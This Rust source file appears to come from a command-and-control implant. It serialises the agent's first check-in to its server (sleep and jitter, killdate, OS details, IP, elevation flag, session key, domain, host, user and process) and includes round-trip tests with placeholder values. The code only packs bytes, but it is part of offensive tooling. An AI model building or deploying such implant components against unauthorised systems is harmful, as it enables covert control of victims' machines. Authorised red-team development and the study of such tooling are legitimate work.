//! First check-in beat (docs/WIRE.md): the 19-field sysinfo block the
//! server's CreateAgent parses. The field ORDER is the contract — pinned
//! by tests that replay the Go parser (CheckPacker sequence of the native
//! plugin) against our writer's output.

use crate::wire::Writer;

/// Values collected at bootstrap by the beacon (API-resolved, unsafe side);
/// the beat writer itself is pure.
pub struct BeatData<'a> {
    pub sleep_sec: u32,
    pub jitter_pct: u32,
    pub killdate: u32,
    pub workingtime: u32,
    pub acp: u16,
    pub oemcp: u16,
    pub gmt_offset: i8,
    pub pid: u16, // the native wire truncates PIDs to 16 bits (word)
    pub tid: u16,
    pub build_number: u32,
    pub major: u8,
    pub minor: u8,
    pub internal_ip: u32, // host byte order
    /// bit0 = agent x64, bit1 = OS x64, bit2 = elevated, bit3 = server
    pub flags: u8,
    pub session_key: &'a [u8],
    pub domain: &'a [u8],
    pub computer: &'a [u8],
    pub username: &'a [u8],
    pub process: &'a [u8],
}

/// Write the beat. Returns false if the buffer is too small.
pub fn write_beat(w: &mut Writer, b: &BeatData) -> bool {
    w.u32(b.sleep_sec)
        && w.u32(b.jitter_pct)
        && w.u32(b.killdate)
        && w.u32(b.workingtime)
        && w.u16(b.acp)
        && w.u16(b.oemcp)
        && w.u8(b.gmt_offset as u8)
        && w.u16(b.pid)
        && w.u16(b.tid)
        && w.u32(b.build_number)
        && w.u8(b.major)
        && w.u8(b.minor)
        && w.u32(b.internal_ip)
        && w.u8(b.flags)
        && w.array(b.session_key)
        && w.array(b.domain)
        && w.array(b.computer)
        && w.array(b.username)
        && w.array(b.process)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::wire::Reader;
    use std::prelude::v1::*;

    #[test]
    fn beat_round_trips_the_native_parser_order() {
        let beat = BeatData {
            sleep_sec: 60,
            jitter_pct: 10,
            killdate: 1_767_225_600,
            workingtime: 0,
            acp: 1252,
            oemcp: 437,
            gmt_offset: 2,
            pid: 0x1234,
            tid: 0x5678,
            build_number: 26100,
            major: 10,
            minor: 0,
            internal_ip: 0x0A00_020F, // 10.0.2.15 in host order
            flags: 0b0000_0011,       // x64 agent + x64 OS
            session_key: &[0x42u8; 32],
            domain: b"MEGACORP",
            computer: b"WIN-TEST",
            username: b"nariod",
            process: b"testhost.exe",
        };
        let mut buf = [0u8; 160];
        let mut w = Writer::new(&mut buf);
        assert!(write_beat(&mut w, &beat));
        let len = w.written();

        // Replay the native CreateAgent field order.
        let mut r = Reader::new(&buf[..len]);
        assert_eq!(r.u32(), Some(60)); // sleep
        assert_eq!(r.u32(), Some(10)); // jitter
        assert_eq!(r.u32(), Some(1_767_225_600)); // killdate
        assert_eq!(r.u32(), Some(0)); // workingtime
        assert_eq!(r.u16(), Some(1252)); // ACP
        assert_eq!(r.u16(), Some(437)); // OemCP
        assert_eq!(r.u8(), Some(2)); // gmt offset
        assert_eq!(r.u16(), Some(0x1234)); // pid
        assert_eq!(r.u16(), Some(0x5678)); // tid
        assert_eq!(r.u32(), Some(26100)); // build
        assert_eq!(r.u8(), Some(10)); // major
        assert_eq!(r.u8(), Some(0)); // minor
        assert_eq!(r.u32(), Some(0x0A00_020F)); // ip
        assert_eq!(r.u8(), Some(0b11)); // flags: x64 + osx64
        assert_eq!(r.array(), Some(&[0x42u8; 32][..])); // session key
        assert_eq!(r.array(), Some(&b"MEGACORP"[..]));
        assert_eq!(r.array(), Some(&b"WIN-TEST"[..]));
        assert_eq!(r.array(), Some(&b"nariod"[..]));
        assert_eq!(r.array(), Some(&b"testhost.exe"[..]));
        assert_eq!(r.remaining(), 0);
    }

    #[test]
    fn beat_fits_a_512_buffer_for_mvp_data() {
        let beat = BeatData {
            sleep_sec: 30,
            jitter_pct: 10,
            killdate: 0,
            workingtime: 0,
            acp: 1252,
            oemcp: 437,
            gmt_offset: 0,
            pid: 1,
            tid: 2,
            build_number: 26100,
            major: 10,
            minor: 0,
            internal_ip: 0,
            flags: 0,
            session_key: &[0u8; 32],
            domain: b"X",
            computer: b"Y",
            username: b"Z",
            process: b"W",
        };
        let mut buf = [0u8; 512];
        let mut w = Writer::new(&mut buf);
        assert!(write_beat(&mut w, &beat));
        assert!(w.written() < 200);
    }
}
